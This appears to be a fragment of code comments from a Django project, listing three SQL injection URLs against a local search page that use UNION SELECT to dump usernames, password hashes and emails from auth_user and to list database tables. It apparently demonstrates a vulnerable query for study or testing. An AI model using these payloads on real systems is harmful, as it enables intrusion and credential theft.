...
# http://localhost:8000/search/?q=' UNION SELECT id, username, password, email, id FROM auth_user --
# http://localhost:8000/search/?q=' UNION SELECT 1, name, 3, 4, 5 FROM sqlite_master WHERE type='table' --

# http://localhost:8000/search/?q=' UNION SELECT id, username, password, password AS created_at, id FROM auth_user --
```
